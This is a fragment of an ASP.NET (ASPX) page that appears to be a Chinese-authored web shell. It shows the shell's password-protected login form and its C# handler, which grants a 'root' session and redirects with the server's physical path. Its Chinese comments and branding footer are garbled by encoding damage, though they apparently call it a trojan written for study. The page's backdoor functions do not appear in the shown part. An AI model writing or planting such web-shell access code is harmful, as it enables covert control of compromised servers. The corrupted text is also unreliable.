<% }
}
else
{
%>
<form id="Form10" runat="server"> 
<font color = "00c000">/*ֻ֧������¼�������ûس�*/</font></p>
<font color = "00c000">/*����:����ҳľ�����Visual C# 2005 ��д,����ѧϰ�о�֮��,�������ڷǷ�*/</font></p>
<table>
<tr>
<td><asp:TextBox ID="pass" runat="server" TextMode="Password" ForeColor = "#009900"></asp:TextBox></td>
<td><asp:Button ID="Login" runat="server" OnClick="Login_Click" Text="��¼" Width="56px" Height="26px"/></td>
</tr>
</table>
</form>
<script runat="server">
void Login_Click(object sender, EventArgs e)
{
if (pass.Text == PWD)
{
Session["root"] = 1;
Session.Timeout = 90;
Response.Redirect(Request.Url+"?page=index&src="+ Server.MapPath(".")+"\\");
}
else
Response.Write("�������");
}
</script>
<% 
} 
%>
<hr>
<table align="center"><font color="#009900">���ۿƼ�ר��AspX���� By:���ۿƼ�</font></table>
</table>

